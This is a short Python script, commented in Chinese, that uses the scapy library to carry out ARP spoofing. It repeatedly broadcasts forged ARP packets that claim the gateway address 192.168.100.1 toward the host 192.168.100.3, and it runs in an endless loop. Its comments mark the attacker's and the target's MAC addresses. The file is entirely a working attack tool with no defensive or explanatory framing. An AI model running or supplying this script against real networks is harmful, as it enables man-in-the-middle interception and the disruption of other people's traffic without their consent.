# coding=utf-8
# scapy伪装网络协议的一种工具库
from scapy.all import *
import sys
import time

# 目标主机ip 网关
from scapy.layers.l2 import ARP, Ether


def arp_spoof():
    try:
        # hwsrc攻击方mac psrc路由器ip
        # hwdst目标mac pdst目标ip
        # hwsrc = 'ff:ff:ff:ff:ff:ff',
        #  hwdst='74-9d-8f-63-6e-42',
        # 3层协议
        arp_request = ARP(pdst='192.168.100.3', psrc='192.168.100.1')
        # 2层协议
        # src攻击方mac地址 src='ff:ff:ff:ff:ff:ff',
        # dst='74-9d-8f-63-6e-42'
        eth_request = Ether(dst='ff:ff:ff:ff:ff:ff')
        request = eth_request / arp_request
        sendp(request)
    except:
        print('发送失败')


def main():
    while True:
        arp_spoof()


if __name__ == '__main__':
    main()
